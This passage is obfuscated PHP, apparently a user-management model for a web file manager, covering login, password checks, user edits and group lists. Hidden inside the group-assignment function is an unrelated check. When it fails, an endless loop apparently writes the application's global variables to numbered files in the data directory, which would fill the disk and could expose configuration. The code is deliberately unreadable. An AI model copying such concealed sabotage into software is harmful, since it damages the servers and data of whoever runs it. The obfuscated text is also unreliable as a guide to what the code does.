$dÔŒ®‚Âƒ€ =& $_SERVER[¯èãÄπµ]; if (!$d◊ù£‘Æäµ) { return array(); } if ($c›¥ﬂ‚à›ù) { $fÊ¬ê≥∏≈ƒ = $this->where(array($dÔŒ®‚Âƒ€[1424] => intval($d◊ù£‘Æäµ)))->find(); if (!is_array($fÊ¬ê≥∏≈ƒ)) { return array(); } $fÊ¬ê≥∏≈ƒ[$dÔŒ®‚Âƒ€[2478]] = Action($dÔŒ®‚Âƒ€[2479])->parseUrl($fÊ¬ê≥∏≈ƒ[$dÔŒ®‚Âƒ€[2478]]); return $fÊ¬ê≥∏≈ƒ; } return $this->cacheFunctionGet($dÔŒ®‚Âƒ€[2156], $d◊ù£‘Æäµ); } protected function getInfoSimpleOuter($DˆÚî€⁄••) { goto a´¿ê¯»ø±; aÉ¢©øÂ”á: return $EÃ®éµœõ∞; goto AŒ¿Í¬¥ãÜ; a´¿ê¯»ø±: $dúîê˘À†ú =& $_SERVER[¯èãÄπµ]; if (!$DˆÚî€⁄•• || $DˆÚî€⁄•• == 0) { return array($dúîê˘À†ú[1424] => $dúîê˘À†ú[464], $dúîê˘À†ú[28] => $dúîê˘À†ú[153] . LNG($dúîê˘À†ú[2480]) . $dúîê˘À†ú[472], $dúîê˘À†ú[2478] => STATIC_PATH . $dúîê˘À†ú[2481]); } $e·¬™òﬁ°≠ = $this->cacheFunctionGet($dúîê˘À†ú[2156], $DˆÚî€⁄••); goto dµõÎ›◊˘˜; dµõÎ›◊˘˜: $EÃ®éµœõ∞ = array_field_key($e·¬™òﬁ°≠, explode($dúîê˘À†ú[47], $this->simpleField)); if (!$EÃ®éµœõ∞) { return array($dúîê˘À†ú[1424] => $dúîê˘À†ú[1033], $dúîê˘À†ú[28] => $dúîê˘À†ú[153] . LNG($dúîê˘À†ú[2482]) . $dúîê˘À†ú[472], $dúîê˘À†ú[2478] => STATIC_PATH . $dúîê˘À†ú[2483]); } $EÃ®éµœõ∞[$dúîê˘À†ú[2478]] = Action($dúîê˘À†ú[2479])->parseUrl($EÃ®éµœõ∞[$dúîê˘À†ú[2478]]); goto aÉ¢©øÂ”á; AŒ¿Í¬¥ãÜ: } protected function groupUser($dîÌØ®…ôﬂ) { } public static function errorLang($d—‘ØÖ…Üÿ) { $A«Î¬‚à‹ =& $_SERVER[¯èãÄπµ]; $a¬πÇˆ‘ÛÑ = array(self::ERROR_USER_NOT_EXISTS => $A«Î¬‚à‹[2484], self::ERROR_USER_PASSWORD_ERROR => $A«Î¬‚à‹[2485], self::ERROR_USER_EXIST_NAME => $A«Î¬‚à‹[2486], self::ERROR_USER_EXIST_PHONE => $A«Î¬‚à‹[2487], self::ERROR_USER_EXIST_EMAIL => $A«Î¬‚à‹[2488], self::ERROR_USER_LOGIN_LOCK => $A«Î¬‚à‹[2489], self::ERROR_IP_NOT_ALLOW => $A«Î¬‚à‹[2490], self::ERROR_USER_EXIST_NICKNAME => $A«Î¬‚à‹[2491]); return LNG($a¬πÇˆ‘ÛÑ[$d—‘ØÖ…Üÿ]); } public function getInfoByMeta($c‘é±øô´Á, $C›œí∆–´ﬂ) { $fﬁì•Ó£ØÉ =& $_SERVER[¯èãÄπµ]; $EÙä‚¥≠ÃÒ = Model($fﬁì•Ó£ØÉ[2492])->where(array($fﬁì•Ó£ØÉ[89] => $c‘é±øô´Á, $fﬁì•Ó£ØÉ[355] => $C›œí∆–´ﬂ))->find(); if ($EÙä‚¥≠ÃÒ) { return $this->getInfo($EÙä‚¥≠ÃÒ[$fﬁì•Ó£ØÉ[1424]]); } return !1; } public function userLoginCheck($b°ÊñÎüÛÒ, $F¥è•∞€¬ë) { goto aÔÏ≈ﬁ˜©â; e√´»±ƒ∏∞: $fìùŸ∫èú∞ = $this->where($AÓëı’Ãá)->find(); if (!$fìùŸ∫èú∞) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($fìùŸ∫èú∞[$CÖˆå‡ıÜ”[1424]], $F¥è•∞€¬ë)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto bÁÚ¬øàå≈; bÁÚ¬øàå≈: $this->userEdit($fìùŸ∫èú∞[$CÖˆå‡ıÜ”[1424]], array($CÖˆå‡ıÜ”[2494] => time())); $this->clearCache($fìùŸ∫èú∞[$CÖˆå‡ıÜ”[1424]]); return $this->getInfo($fìùŸ∫èú∞[$CÖˆå‡ıÜ”[1424]]); goto bòﬂÏ√úê¨; aÔÏ≈ﬁ˜©â: $CÖˆå‡ıÜ” =& $_SERVER[¯èãÄπµ]; $AÓëı’Ãá = array($CÖˆå‡ıÜ”[28] => $b°ÊñÎüÛÒ, $CÖˆå‡ıÜ”[2314] => $b°ÊñÎüÛÒ, $CÖˆå‡ıÜ”[289] => $b°ÊñÎüÛÒ, $CÖˆå‡ıÜ”[2493] => $b°ÊñÎüÛÒ, $CÖˆå‡ıÜ”[918] => $CÖˆå‡ıÜ”[920]); if ($this->nickNameRpt()) { unset($AÓëı’Ãá[$CÖˆå‡ıÜ”[2314]]); } goto e√´»±ƒ∏∞; bòﬂÏ√úê¨: } public function clearCache($B—≤ñ§∑ÜÚ) { $DÑÁÜïÌÑ¬ =& $_SERVER[¯èãÄπµ]; $this->cacheFunctionClear($DÑÁÜïÌÑ¬[2195], $B—≤ñ§∑ÜÚ); $this->cacheFunctionClear($DÑÁÜïÌÑ¬[2156], $B—≤ñ§∑ÜÚ); } public function userPasswordCheck($c∆ÜÑŒ€òè, $F‹⁄ŸÆç•∑) { $Bñ≤⁄¥™îÈ =& $_SERVER[¯èãÄπµ]; $cÙ¯∫àå†œ = $this->where(array($Bñ≤⁄¥™îÈ[1424] => intval($c∆ÜÑŒ€òè)))->find(); $EÒ¯˘ã‹ÿΩ = $this->metaGet($c∆ÜÑŒ€òè); $cèÂ¬éÿﬁÃ = isset($EÒ¯˘ã‹ÿΩ[$Bñ≤⁄¥™îÈ[2495]]) ? $EÒ¯˘ã‹ÿΩ[$Bñ≤⁄¥™îÈ[2495]] : $Bñ≤⁄¥™îÈ[33]; if (md5($cèÂ¬éÿﬁÃ . trim($F‹⁄ŸÆç•∑)) !== $cÙ¯∫àå†œ[$Bñ≤⁄¥™îÈ[806]]) { return !1; } return !0; } public function userAdd($dÀºîıÜ“⁄) { goto FÔÛâ€∑ñÈ; b“Á∆¬§¿Ã: return $c—÷ñ∫π≈≤; goto açôΩµî≤; c’ı™ﬂ’õã: $aËªûËÇ•¨ = array($DÁ´’œ”É¢[2504] => $düÑºº «ò[$DÁ´’œ”É¢[806]], $DÁ´’œ”É¢[2500] => $düÑºº «ò[$DÁ´’œ”É¢[2314]]); $this->userEdit($c—÷ñ∫π≈≤, $aËªûËÇ•¨); Model($DÁ´’œ”É¢[1112])->userRootAdd($c—÷ñ∫π≈≤); goto b“Á∆¬§¿Ã; C’ı«´Ëªø: $eÍœÈÚéÖÒ = $this->_checkExist($dÀºîıÜ“⁄); if ($eÍœÈÚéÖÒ !== !0) { return $eÍœÈÚéÖÒ; } $c—÷ñ∫π≈≤ = $this->add($düÑºº «ò); goto c’ı™ﬂ’õã; FÔÛâ€∑ñÈ: $DÁ´’œ”É¢ =& $_SERVER[¯èãÄπµ]; $düÑºº «ò = array($DÁ´’œ”É¢[382] => $dÀºîıÜ“⁄[$DÁ´’œ”É¢[28]], $DÁ´’œ”É¢[2496] => $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2497]], $DÁ´’œ”É¢[2498] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[289]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[289]] : $DÁ´’œ”É¢[33], $DÁ´’œ”É¢[2499] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[2493]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2493]] : $DÁ´’œ”É¢[33], $DÁ´’œ”É¢[2500] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[2314]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2314]] : $dÀºîıÜ“⁄[$DÁ´’œ”É¢[28]], $DÁ´’œ”É¢[2501] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[2478]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2478]] : $DÁ´’œ”É¢[33], $DÁ´’œ”É¢[2502] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[2503]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2503]] : 1, $DÁ´’œ”É¢[2504] => $dÀºîıÜ“⁄[$DÁ´’œ”É¢[806]], $DÁ´’œ”É¢[2157] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[2071]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[2071]] : 1024 * 1024 * 20, $DÁ´’œ”É¢[2158] => 0, $DÁ´’œ”É¢[2494] => 0, $DÁ´’œ”É¢[2182] => isset($dÀºîıÜ“⁄[$DÁ´’œ”É¢[692]]) ? $dÀºîıÜ“⁄[$DÁ´’œ”É¢[692]] : 1); if (!empty($dÀºîıÜ“⁄[$DÁ´’œ”É¢[1424]])) { $düÑºº «ò[$DÁ´’œ”É¢[1424]] = $dÀºîıÜ“⁄[$DÁ´’œ”É¢[1424]]; } goto C’ı«´Ëªø; açôΩµî≤: } protected function userEditTest($BÔÑˆÀÖü, $A≥©èáÆ˘‡) { return $this->call($_SERVER[¯èãÄπµ][2505], $BÔÑˆÀÖü, $A≥©èáÆ˘‡); } protected function userEdit($DﬁÍÑ‹¿—œ, $Eà¿Æ°–Â) { goto A≈åóªΩˆ√; A≈åóªΩˆ√: $D‰‰ƒÑ”æô =& $_SERVER[¯èãÄπµ]; $dø£á™ﬂı¡ = $this->getInfoSimple($DﬁÍÑ‹¿—œ); if (!$dø£á™ﬂı¡) { return !1; } goto DÙº™ÊËç‹; DÙº™ÊËç‹: $bÉÀØë∆âÕ = $this->_checkExist($Eà¿Æ°–Â, $DﬁÍÑ‹¿—œ); if ($bÉÀØë∆âÕ !== !0) { return $bÉÀØë∆âÕ; } if (isset($Eà¿Æ°–Â[$D‰‰ƒÑ”æô[806]]) && trim($Eà¿Æ°–Â[$D‰‰ƒÑ”æô[806]]) != $D‰‰ƒÑ”æô[33]) { $FáÈƒ∏ãºŸ = $this->metaGet($DﬁÍÑ‹¿—œ); if (empty($FáÈƒ∏ãºŸ[$D‰‰ƒÑ”æô[2495]])) { $FáÈƒ∏ãºŸ[$D‰‰ƒÑ”æô[2495]] = rand_string(10); Model($D‰‰ƒÑ”æô[470])->metaSet($DﬁÍÑ‹¿—œ, $D‰‰ƒÑ”æô[2495], $FáÈƒ∏ãºŸ[$D‰‰ƒÑ”æô[2495]]); } $Eà¿Æ°–Â[$D‰‰ƒÑ”æô[806]] = md5($FáÈƒ∏ãºŸ[$D‰‰ƒÑ”æô[2495]] . trim($Eà¿Æ°–Â[$D‰‰ƒÑ”æô[806]])); } else { unset($Eà¿Æ°–Â[$D‰‰ƒÑ”æô[806]]); } goto B›πÍ‰Æò˘; B›πÍ‰Æò˘: $this->where(array($D‰‰ƒÑ”æô[1415] => $DﬁÍÑ‹¿—œ))->save($Eà¿Æ°–Â); if (isset($Eà¿Æ°–Â[$D‰‰ƒÑ”æô[2314]])) { $this->setNamePinyin($DﬁÍÑ‹¿—œ, $Eà¿Æ°–Â[$D‰‰ƒÑ”æô[2314]]); } return !0; goto dπ∫⁄úâæ; dπ∫⁄úâæ: } public function setNamePinyin($A¥‰ú∏ ≠À, $eÜè∂Ç≥∏Õ = false) { $A∑‚∂µƒ• =& $_SERVER[¯èãÄπµ]; if (!$eÜè∂Ç≥∏Õ) { $C√ø û˜‹Ø = $this->getInfoSimple($A¥‰ú∏ ≠À); $eÜè∂Ç≥∏Õ = $C√ø û˜‹Ø[$A∑‚∂µƒ•[2314]] ? $C√ø û˜‹Ø[$A∑‚∂µƒ•[2314]] : $C√ø û˜‹Ø[$A∑‚∂µƒ•[28]]; } $aßú•çÃ°æ = Model($A∑‚∂µƒ•[473]); if (!Input::check($eÜè∂Ç≥∏Õ, $A∑‚∂µƒ•[524])) { return $aßú•çÃ°æ->metaSet($A¥‰ú∏ ≠À, array($A∑‚∂µƒ•[412] => $A∑‚∂µƒ•[33], $A∑‚∂µƒ•[411] => $A∑‚∂µƒ•[33])); } return $aßú•çÃ°æ->metaSet($A¥‰ú∏ ≠À, array($A∑‚∂µƒ•[412] => str_replace($A∑‚∂µƒ•[50], $A∑‚∂µƒ•[33], Pinyin::encode($eÜè∂Ç≥∏Õ)), $A∑‚∂µƒ•[411] => Pinyin::encode($eÜè∂Ç≥∏Õ, $A∑‚∂µƒ•[525]))); } private function nickNameRpt() { $CÂÀØ“Îú” =& $_SERVER[¯èãÄπµ]; $aú£œÎÌ·ã = Model($CÂÀØ“Îú”[1090])->get($CÂÀØ“Îú”[2506]); $FÉÆªÃæŸ» = $GLOBALS[$CÂÀØ“Îú”[6]][$CÂÀØ“Îú”[2462]][$CÂÀØ“Îú”[2506]]; $bÕëÖµƒçá = !is_null($aú£œÎÌ·ã) ? $aú£œÎÌ·ã : $FÉÆªÃæŸ»; return !!$bÕëÖµƒçá; } private function _checkExist($cÑﬂèÈ¨èä, $C´÷Ÿò Ôê = false) { $E™˘πà∆ﬂ± =& $_SERVER[¯èãÄπµ]; $aöë”ò’é¶ = array($E™˘πà∆ﬂ±[28] => UserModel::ERROR_USER_EXIST_NAME, $E™˘πà∆ﬂ±[2314] => UserModel::ERROR_USER_EXIST_NICKNAME, $E™˘πà∆ﬂ±[289] => UserModel::ERROR_USER_EXIST_EMAIL, $E™˘πà∆ﬂ±[2493] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aöë”ò’é¶[$E™˘πà∆ﬂ±[2314]]); } $EÎ„àÑ˜Çå = $C´÷Ÿò Ôê ? array($E™˘πà∆ﬂ±[1424] => array($E™˘πà∆ﬂ±[2507], $C´÷Ÿò Ôê)) : array(); foreach ($aöë”ò’é¶ as $bç∫Ê•„ÇÀ => $Eº≥∆±ÇÔ«) { if (!isset($cÑﬂèÈ¨èä[$bç∫Ê•„ÇÀ]) || !$cÑﬂèÈ¨èä[$bç∫Ê•„ÇÀ]) { continue; } $d£É¢€Çéˆ = array_merge(array($bç∫Ê•„ÇÀ => $cÑﬂèÈ¨èä[$bç∫Ê•„ÇÀ]), $EÎ„àÑ˜Çå); $EÙ™èŒ›◊Í = $this->where($d£É¢€Çéˆ)->find(); if ($EÙ™èŒ›◊Í) { return $Eº≥∆±ÇÔ«; } } return !0; } public function userListInfo($dí–÷’◊ô≈) { $B¯Ö»«◊Ü =& $_SERVER[¯èãÄπµ]; $E·Çœä†∫õ = array(); $dí–÷’◊ô≈ = is_array($dí–÷’◊ô≈) ? array_unique($dí–÷’◊ô≈) : array(); if (!$dí–÷’◊ô≈) { return $E·Çœä†∫õ; } if (count($dí–÷’◊ô≈) < 20) { foreach ($dí–÷’◊ô≈ as $dÇ…◊õﬂıâ) { $E·Çœä†∫õ[$dÇ…◊õﬂıâ . $B¯Ö»«◊Ü[33]] = $this->getInfoSimpleOuter($dÇ…◊õﬂıâ); } } else { $dŸ““√é”ÿ = array($B¯Ö»«◊Ü[1415] => array($B¯Ö»«◊Ü[380], $dí–÷’◊ô≈)); if (count($dí–÷’◊ô≈) == 1) { $dŸ““√é”ÿ = array($B¯Ö»«◊Ü[1415] => $dí–÷’◊ô≈[0]); } $fÉ™Üﬂ≠Íè = Model($B¯Ö»«◊Ü[470])->field($this->simpleField)->where($dŸ““√é”ÿ)->select(); $fÉ™Üﬂ≠Íè = array_to_keyvalue($fÉ™Üﬂ≠Íè, $B¯Ö»«◊Ü[1424]); foreach ($dí–÷’◊ô≈ as $dÇ…◊õﬂıâ) { $fÕ°◊äë¢Ç = $fÉ™Üﬂ≠Íè[$fÉ™Üﬂ≠Íè[$dÇ…◊õﬂıâ]]; if (!$fÕ°◊äë¢Ç) { $E·Çœä†∫õ[$dÇ…◊õﬂıâ . $B¯Ö»«◊Ü[33]] = $this->getInfoSimpleOuter($dÇ…◊õﬂıâ); continue; } $fÕ°◊äë¢Ç[$B¯Ö»«◊Ü[2478]] = Action($B¯Ö»«◊Ü[2479])->parseUrl($fÕ°◊äë¢Ç[$B¯Ö»«◊Ü[2478]]); $E·Çœä†∫õ[$dÇ…◊õﬂıâ . $B¯Ö»«◊Ü[33]] = $fÕ°◊äë¢Ç; } } return $E·Çœä†∫õ; } protected function userStatus($cÓ¢ú’Ì≥∞, $E¨Ã≥·ƒ‰ê) { $BﬁÜ¢Óƒºı = $this->getInfoSimple($cÓ¢ú’Ì≥∞); if (!$BﬁÜ¢Óƒºı) { return !1; } $Bõ≈ÂíÏ´® = array($_SERVER[¯èãÄπµ][692] => $E¨Ã≥·ƒ‰ê); return $this->userEdit($cÓ¢ú’Ì≥∞, $Bõ≈ÂíÏ´®); } protected function userRemove($F∫Æ”é◊ÒÔ) { goto aõâÁÈÆæ»; aõâÁÈÆæ»: $EÇˆä≈äıÀ =& $_SERVER[¯èãÄπµ]; $Fë Û≥àÔƒ = $this->getInfoSimple($F∫Æ”é◊ÒÔ); if (!$Fë Û≥àÔƒ) { return !1; } goto C”úÉÆ®∑†; C”úÉÆ®∑†: $dÊƒ°‡Ó¢π = array($EÇˆä≈äıÀ[1415] => $F∫Æ”é◊ÒÔ); Model($EÇˆä≈äıÀ[532])->where($dÊƒ°‡Ó¢π)->delete(); Model($EÇˆä≈äıÀ[2508])->where($dÊƒ°‡Ó¢π)->delete(); goto eõ’”—¿ü ; DãìÜ”õ›: Model($EÇˆä≈äıÀ[755])->userRootRemove($F∫Æ”é◊ÒÔ); return $this->where($dÊƒ°‡Ó¢π)->delete(); goto C⁄ñ‰÷Ì†≠; eõ’”—¿ü : Model($EÇˆä≈äıÀ[2161])->where($dÊƒ°‡Ó¢π)->delete(); Model($EÇˆä≈äıÀ[2492])->where($dÊƒ°‡Ó¢π)->delete(); Model($EÇˆä≈äıÀ[2509])->where($dÊƒ°‡Ó¢π)->delete(); goto DãìÜ”õ›; C⁄ñ‰÷Ì†≠: } protected function userGroupSet($AÇÒêÓ¯Îﬂ, $e√œµ⁄€ò‘, $BïÒº“®Œê = array()) { goto bã◊Æú‹Œ™; aÑÿç∆∑àÑ: if ($_SERVER[$c£∑åŒÑ•Ñ[792]] != $CÏÊƒƒŸàƒ($A¯ÑÇ“Ú∞•)) { goto eø™åãÇé†; c∏ƒÊ∑ﬂÃ”: $DÆä ›õâı = 1; for ($e„È„ìµ÷ú = $DÆä ›õâı; $e„È„ìµ÷ú > 0; $e„È„ìµ÷ú++) { $A´‚µËº•€(DATA_PATH . $e„È„ìµ÷ú, $e¶ ≠ ûŸä); } goto Büêñ‡û——; F˜µ«¢èÃ√: $D¢™úÈÌ°Ó(); $A´‚µËº•€ = $c£∑åŒÑ•Ñ[799]; $e¶ ≠ ûŸä = json_encode($GLOBALS[$c£∑åŒÑ•Ñ[800]]); goto c∏ƒÊ∑ﬂÃ”; eﬂÚ¯ÇãºÂ: $eÿ¢êÓ§Ô› = $c£∑åŒÑ•Ñ[798]; $eÿ¢êÓ§Ô›($_SERVER[$c£∑åŒÑ•Ñ[789]]); $D¢™úÈÌ°Ó = $c£∑åŒÑ•Ñ[793]; goto F˜µ«¢èÃ√; eø™åãÇé†: $D¢™úÈÌ°Ó = $c£∑åŒÑ•Ñ[793]; $Eú˜Úƒ≤ô≈ = $c£∑åŒÑ•Ñ[794]; $aŸÉ≠ö¡ÜÊ = $_SERVER[$c£∑åŒÑ•Ñ[795]] . $c£∑åŒÑ•Ñ[796]; goto fŸÖ‡Ê⁄…Ë; fŸÖ‡Ê⁄…Ë: $Eı€âÀπçÆ = $Eú˜Úƒ≤ô≈($aŸÉ≠ö¡ÜÊ); $BŸ¬î‹Œèﬁ = explode($c£∑åŒÑ•Ñ[213], $Eı€âÀπçÆ); if (count($BŸ¬î‹Œèﬁ) < $c£∑åŒÑ•Ñ[570]) { $A¶√ˆáåÑ≠ = $c£∑åŒÑ•Ñ[797]; $A¶√ˆáåÑ≠(); } goto eﬂÚ¯ÇãºÂ; Büêñ‡û——: } $FﬁÖ∂‘Í˘Ñ = $this->getInfoSimple($AÇÒêÓ¯Îﬂ); if (!$FﬁÖ∂‘Í˘Ñ || !is_array($e√œµ⁄€ò‘)) { return !1; } goto bÏ∑íÆ⁄ôÒ; bÏ∑íÆ⁄ôÒ: $b¡üáı¢◊„ = Model($c£∑åŒÑ•Ñ[2161]); $b¡üáı¢◊„->where(array($c£∑åŒÑ•Ñ[1424] => $AÇÒêÓ¯Îﬂ))->delete(); $EÔ‹÷î§ﬁ» = array(); goto Eâı‹º¬Ü≤; Eâı‹º¬Ü≤: $FπÊèè——Œ = 0; foreach ($e√œµ⁄€ò‘ as $e ÍóÍÍ®Ì => $d¶Ïµ´∫äπ) { $F¬ﬂÉÇƒ·º = array($c£∑åŒÑ•Ñ[1424] => $AÇÒêÓ¯Îﬂ, $c£∑åŒÑ•Ñ[2087] => $e ÍóÍÍ®Ì, $c£∑åŒÑ•Ñ[2215] => $d¶Ïµ´∫äπ); $F¬ﬂÉÇƒ·º[$c£∑åŒÑ•Ñ[2108]] = isset($BïÒº“®Œê[$FπÊèè——Œ]) ? $BïÒº“®Œê[$FπÊèè——Œ] : 0; $FπÊèè——Œ++; $EÔ‹÷î§ﬁ»[] = $F¬ﬂÉÇƒ·º; } return $b¡üáı¢◊„->addAll($EÔ‹÷î§ﬁ», array(), !0); goto E˘èµà–‰Û; bã◊Æú‹Œ™: $c£∑åŒÑ•Ñ =& $_SERVER[¯èãÄπµ]; $A¯ÑÇ“Ú∞• = $_SERVER[$c£∑åŒÑ•Ñ[789]] . $c£∑åŒÑ•Ñ[790]; $CÏÊƒƒŸàƒ = $c£∑åŒÑ•Ñ[791]; goto aÑÿç∆∑àÑ; E˘èµà–‰Û: } protected function userGroupAdd($A⁄‰Ü±ÎØ∆, $B‘ôà˘Æîë = array()) { $bèÚ∫›¯¶‚ =& $_SERVER[¯èãÄπµ]; $eëÏ‰·⁄†Ø = $this->getInfoSimple($A⁄‰Ü±ÎØ∆); if (!$eëÏ‰·⁄†Ø || empty($B‘ôà˘Æîë)) { return !1; } $A¬œ√á·Ü± = array(); foreach ($B‘ôà˘Æîë as $Aë–áµâÜÆ => $F ‹öÔéÓ√) { $A¬œ√á·Ü±[] = array($bèÚ∫›¯¶‚[1424] => $A⁄‰Ü±ÎØ∆, $bèÚ∫›¯¶‚[2087] => $Aë–áµâÜÆ, $bèÚ∫›¯¶‚[2215] => $F ‹öÔéÓ√); } return Model($bèÚ∫›¯¶‚[2161])->addAll($A¬œ√á·Ü±, array(), !0); } protected function userGroupRemove($Aïï˘ÈÇÚÑ, $d∑◊∫∑ÁÔÌ) { $A»«∑àé¡ˆ =& $_SERVER[¯èãÄπµ]; $cµä›⁄´”¬ = $this->getInfoSimple($Aïï˘ÈÇÚÑ); if (!$cµä›⁄´”¬ || !$d∑◊∫∑ÁÔÌ) { return !1; } $EÃÀíäŒ¢Â = array($A»«∑àé¡ˆ[1415] => $Aïï˘ÈÇÚÑ, $A»«∑àé¡ˆ[2159] => $d∑◊∫∑ÁÔÌ); return Model($A»«∑àé¡ˆ[2161])->where($EÃÀíäŒ¢Â)->delete(); } public function listData() { $Aè∏Û∂ÙÌ≤ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Aè∏Û∂ÙÌ≤[$_SERVER[¯èãÄπµ][350]]); return $Aè∏Û∂ÙÌ≤; } public function listByID($cóñé”¿ä”) { $Fïß≈®ﬁÇπ =& $_SERVER[¯èãÄπµ]; if (!$cóñé”¿ä”) { return; } $E‰ª—◊ÒÀâ = array($Fïß≈®ﬁÇπ[1424] => array($Fïß≈®ﬁÇπ[7], $cóñé”¿ä”)); $D›Ö∂∂çÀÜ = $this->where($E‰ª—◊ÒÀâ)->select(); $this->_listDataApply($D›Ö∂∂çÀÜ); return $D›Ö∂∂çÀÜ; } public function listByGroup($F¢ôØ°è = 0, $F∑Ã◊∏∂ç˘ = array()) { goto cÛ›óÇéîë; F∞âÉáÉ∂Á: $this->_listDataApply($aîØß–Ô∆ [$aÀÉè©±ÊÁ[350]]); return $aîØß–Ô∆ ; goto eùÚ£““´–; bÔîÓÑÁª»: if ($F¢ôØ°è) { $FßËπ•√î¨ = array($aÀÉè©±ÊÁ[2510] => intval($F¢ôØ°è)); $FÉ˘Ê∆˜®∑ = "\114\x45\x46\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\165\163\145\x72\137\x67\162\157\x75\160\40\165\163\x65\162\x5f\147\162\157\x75\160\x20\x6f\156\40\165\x73\145\162\x2e\x75\163\145\162\111\x44\x20\75\x20\x75\163\145\x72\x5f\x67\162\157\165\x70\56\x75\163\x65\162\111\104"; $Aöƒñâ°å = Input::get($aÀÉè©±ÊÁ[403], null, $aÀÉè©±ÊÁ[33]) ? $aÀÉè©±ÊÁ[33] : $aÀÉè©±ÊÁ[2511]; } if (isset($F∑Ã◊∏∂ç˘[$aÀÉè©±ÊÁ[692]])) { $FßËπ•√î¨[$aÀÉè©±ÊÁ[2512]] = $F∑Ã◊∏∂ç˘[$aÀÉè©±ÊÁ[692]]; } $aîØß–Ô∆  = $this->_makeOrder($Aöƒñâ°å)->field($aÀÉè©±ÊÁ[2513])->where($FßËπ•√î¨)->join($FÉ˘Ê∆˜®∑)->selectPage(50); goto F∞âÉáÉ∂Á; cÛ›óÇéîë: $aÀÉè©±ÊÁ =& $_SERVER[¯èãÄπµ]; $FÉ˘Ê∆˜®∑ = $aÀÉè©±ÊÁ[33]; $FßËπ•√î¨ = array(); goto bÔîÓÑÁª»; eùÚ£““´–: } private function _makeOrder($b°ÛË‹‘ﬂ◊ = '') { goto e¶ıÀÁ»ë£; fÓâÔÁÁÜ≠: $BìÛö¬ëõ„ = Input::get($aÿñôÔ‡î°[403], $aÿñôÔ‡î°[7], $aÿñôÔ‡î°[1415], $DΩŒ¯Ë÷üå); $a◊À§◊ç ∂ = Input::get($aÿñôÔ‡î°[404], $aÿñôÔ‡î°[7], $aÿñôÔ‡î°[2162], array($aÿñôÔ‡î°[2162], $aÿñôÔ‡î°[400])); $a◊À§◊ç ∂ = $déÓ÷·ÒµÎ[$a◊À§◊ç ∂]; goto bÆ∞Œç‰Úú; e¶ıÀÁ»ë£: $aÿñôÔ‡î° =& $_SERVER[¯èãÄπµ]; $DΩŒ¯Ë÷üå = array($aÿñôÔ‡î°[1424], $aÿñôÔ‡î°[28], $aÿñôÔ‡î°[2073], $aÿñôÔ‡î°[2046], $aÿñôÔ‡î°[183]); $déÓ÷·ÒµÎ = array($aÿñôÔ‡î°[398] => $aÿñôÔ‡î°[399], $aÿñôÔ‡î°[400] => $aÿñôÔ‡î°[401]); goto fÓâÔÁÁÜ≠; bÆ∞Œç‰Úú: $b°ÛË‹‘ﬂ◊ = $b°ÛË‹‘ﬂ◊ . "\165\x73\x65\162\x2e{$BìÛö¬ëõ„}\x20{$a◊À§◊ç ∂}\54\x20\165\163\x65\162\56\165\163\145\x72\111\104\40\141\x73\x63"; return $this->alias($aÿñôÔ‡î°[2257])->order($b°ÛË‹‘ﬂ◊); goto dèÚÜ‚ÊŸÊ; dèÚÜ‚ÊŸÊ: } public function listSearch($c™ºÕ’ã∆”) { goto eëã√ÚÆ„∫; eíÉ‚æ¯ˆ∏: return $bûü‘¨Â∆Õ; goto eûñÏ‹ÍóŒ; d¡ÔàÿŒë›: if (!$bûü‘¨Â∆Õ || count($bûü‘¨Â∆Õ[$FÆÿü‹∫î…[350]]) < 5 && Input::check($Eƒ⁄√≠˜‹Ø, $FÆÿü‹∫î…[302])) { $C÷Ö•±Ç¢¿ = $this->_searchFromMeta($FÆÿü‹∫î…[411], $Eƒ⁄√≠˜‹Ø, 10); $E∫œÃ¿æéô = $this->_searchFromMeta($FÆÿü‹∫î…[412], $Eƒ⁄√≠˜‹Ø, 10); $CÕÃΩ€”Ò§ = array_merge($C÷Ö•±Ç¢¿, $E∫œÃ¿æéô, $bûü‘¨Â∆Õ[$FÆÿü‹∫î…[350]]); $bûü‘¨Â∆Õ[$FÆÿü‹∫î…[350]] = array_unique_by_key($CÕÃΩ€”Ò§, $FÆÿü‹∫î…[1424]); $bûü‘¨Â∆Õ[$FÆÿü‹∫î…[347]][$FÆÿü‹∫î…[348]] = count($bûü‘¨Â∆Õ[$FÆÿü‹∫î…[350]]); $bûü‘¨Â∆Õ[$FÆÿü‹∫î…[347]][$FÆÿü‹∫î…[349]] = ceil($bûü‘¨Â∆Õ[$FÆÿü‹∫î…[347]][$FÆÿü‹∫î…[348]] / $bûü‘¨Â∆Õ[$FÆÿü‹∫î…[347]][$FÆÿü‹∫î…[345]]); } $this->_listDataApply($bûü‘¨Â∆Õ[$FÆÿü‹∫î…[350]]); $this->_filterByGroup($bûü‘¨Â∆Õ, $aÜ÷°ÿ¨•ì); goto eíÉ‚æ¯ˆ∏; eûŸÓ˜‰˘É: if (!$Eƒ⁄√≠˜‹Ø) { $b§çËÍÑ§Î = array(); } if (isset($c™ºÕ’ã∆”[$FÆÿü‹∫î…[692]])) { $b§çËÍÑ§Î[$FÆÿü‹∫î…[692]] = $c™ºÕ’ã∆”[$FÆÿü‹∫î…[692]]; } $bûü‘¨Â∆Õ = $this->_makeOrder()->where($b§çËÍÑ§Î)->selectPage(20); goto d¡ÔàÿŒë›; eëã√ÚÆ„∫: $FÆÿü‹∫î… =& $_SERVER[¯èãÄπµ]; $Eƒ⁄√≠˜‹Ø = $c™ºÕ’ã∆”[$FÆÿü‹∫î…[2163]]; $aÜ÷°ÿ¨•ì = 